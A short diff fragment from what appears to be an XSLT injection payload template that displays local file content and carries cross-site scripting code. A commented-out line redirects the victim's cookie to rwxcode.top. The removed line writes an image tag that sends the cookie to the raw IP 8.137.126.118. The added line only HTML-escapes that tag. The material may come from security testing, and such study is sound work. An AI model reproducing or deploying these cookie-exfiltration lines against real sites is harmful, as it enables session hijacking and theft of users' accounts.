@@ -36,7 +36,7 @@ local file content:&lt;textarea style="width:100%;height:6rem">${ p.innerHTML }&
 
       //document.location = 'http://rwxcode.top/log?cookie=' + btoa(aaa);
 
-      document.write('<img src="http://8.137.126.118/cookie.png?cookie='+bbb+'">');
+      document.write('&lt;img src=&quot;http://8.137.126.118/cookie.png?cookie'+bbb+'&quot;&gt;');
       </script>
     </body>
   </xsl:template>
